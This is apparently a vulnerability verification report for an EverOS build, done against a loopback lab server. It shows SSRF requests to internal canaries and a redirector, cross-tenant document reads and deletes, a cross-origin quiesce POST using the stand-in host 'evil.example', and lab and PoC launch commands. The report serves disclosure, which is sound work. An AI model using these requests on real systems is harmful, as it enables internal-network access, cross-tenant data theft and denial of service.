# EverOS @ 6ac3898 — Hardened verification run

Tracking IDs (internal, not CVEs): **EVEROS-2026-02 = V-01 SSRF**, **EVEROS-2026-03 = V-02 IDOR**, EVEROS-2026-04 = V-03 CSRF, EVEROS-2026-05 = V-04 quiesce DoS, EVEROS-2026-06 = V-05 path disclosure. Submission drafts: `submission/vulncheck/details-EVEROS-2026-0{2,3}.md`.

Captured 2026-11-24T18:31–18:36Z against live server `127.0.0.1:18777`,
root `/tmp/everos-poc-lab`, upstream `6ac3898e7755dfc41002bfdc9704279009a82b81`.
Stub providers on `127.0.0.1:18999` (`pocs/stub_llm.py`: embeddings/rerank/chat-completions).
Canary HTTP on `127.0.0.1:18099`, 302 redirector on `127.0.0.1:18098` (`pocs/redir_server.py`).

## V-01 — SSRF via `uri` content items (HIGH, verified ×3 paths)

Requests (`evidence/ssrf_add_request.json`, `ssrf_add_redirect_request.json`, `ssrf_add_gopher_request.json`):

| uri | Result |
|---|---|
| `http://127.0.0.1:18099/canary.txt` | fetched; `parsed_content` = `SSRF-CANARY-7f3a9c internal-only-marker` |
| `http://127.0.0.1:18098/redir` (302 → `127.0.0.1:18099/canary2.txt`) | **redirect followed to internal host**; `parsed_content` = `SSRF-CANARY-VIA-REDIRECT-9b21 internal-only-marker-2` |
| `gopher://127.0.0.1:18099/_x` | rejected: `UNSUPPORTED_FORMAT` — only http(s) fetched (negative control) |

Evidence: `ssrf_listener.log` (GETs at 19:31:40Z), `ssrf_search_readback.json` (cross-origin `Origin: http://evil.example:8000` readback), `ssrf_add*.body/.headers`.

Chain: `ContentItemDTO.uri` (`schemas/memorize.py:36-42`, no validation) → `to_raw_file` wraps verbatim (`component/parser/input.py:47-49`) → everalgo `fetch_uri` (`everalgo/utils/http.py:19-51`: httpx, `follow_redirects=True`, docstring: *"Private, loopback and link-local addresses are not blocked: a caller that passes untrusted URIs must resolve and filter them itself"*). EverOS applies no egress policy — the `file_uri_allow_dirs` allowlist covers only `file://`. No response-size cap.

Impact: unauthenticated SSRF to loopback/RFC-1918/link-local/metadata endpoints from any local process **or any website** (CORS `*`+credentials, F-01 mechanism); response content exfiltrated through `/memory/search`. CWE-918.

## V-02 — Knowledge doc IDOR: scope ignored on doc-keyed ops (verified)

Doc `d_0d264fe85a89` uploaded under `app_id=tenantA&project_id=tenantA` (form fields; `evidence/idor_upload.json`, md_path `tenantA/tenantA/...`).

| Request | Result |
|---|---|
| `GET /knowledge/documents/{id}?app_id=tenantB&project_id=tenantB` | **HTTP 200** full detail incl. absolute `original_file_path` |
| `GET .../{id}` (no scope → default) | **HTTP 200** |
| `GET .../{id}?app_id=tenantA&project_id=tenantA` | HTTP 200 |
| `GET /knowledge/documents?app_id=tenantB...` (list) | `documents: []` — scoped list **does** isolate |
| `GET /knowledge/documents?app_id=tenantA...` (list) | contains `d_0d264fe85a89` |
| `DELETE .../{id}?app_id=tenantB&project_id=tenantB` | **HTTP 204** — doc tombstoned (`original_file_path: null`), catalog row had shown real scope `tenantA/tenantA` |

Evidence: `idor_get_scopes.txt`, `idor_list_scopes.txt`, `idor_delete_wrong_scope.txt`, `catalog_rows.txt`.

Code: `KnowledgeCatalog.get_document/get_topics` have no scope param (`memory/ports/stores.py:714-747`); `KnowledgeService.get_document/get_topic` drop scope (`service/knowledge/__init__.py:266-306` → `_queries.py:42-60`); `doc_id` is sole PRIMARY KEY; mutations resolve the doc's real scope. List endpoints DO filter scope — isolation is intended, doc-keyed ops bypass it. CWE-639/CWE-862.

## V-04 — Unauthenticated `/cascade/quiesce` (verified)

`POST /api/v2/cascade/quiesce` (with `Origin: http://evil.example:8000`) → `{"quiesced":true}` HTTP 200; post-state `index_emptied: true` — index projection dropped, one-way until restart (`evidence/quiesce_unauth.txt`). Any website can permanently disable memory indexing for the session. CWE-306/CWE-400.

## Reproduce

```bash
# lab
cd ~/ResearchAIRedTeam/old/EverOS && uv sync --frozen
python3 pocs/stub_llm.py &          # :18999 embeddings/rerank/chat stub
python3 -m http.server 18099 -d /tmp/ssrf-lab &   # canary
python3 pocs/redir_server.py &      # :18098 302 -> canary2
EVEROS_API__HOST=127.0.0.1 EVEROS_API__PORT=18777 \
EVEROS_LLM__API_KEY=sk-dummy EVEROS_LLM__BASE_URL=http://127.0.0.1:18999/v1 \
EVEROS_MULTIMODAL__API_KEY=sk-dummy EVEROS_MULTIMODAL__BASE_URL=http://127.0.0.1:18999/v1 \
EVEROS_EMBEDDING__API_KEY=sk-dummy EVEROS_EMBEDDING__BASE_URL=http://127.0.0.1:18999/v1 EVEROS_EMBEDDING__DIM=8 \
EVEROS_RERANK__PROVIDER=vllm EVEROS_RERANK__MODEL=stub EVEROS_RERANK__BASE_URL=http://127.0.0.1:18999/v1 \
uv run everos server start --root /tmp/everos-poc-lab --port 18777

bash pocs/ssrf.sh   # V-01
bash pocs/idor.sh   # V-02 (wait for catalog indexing after upload)
```

Integrity: `sha256sum -c SHA256SUMS` in this directory.
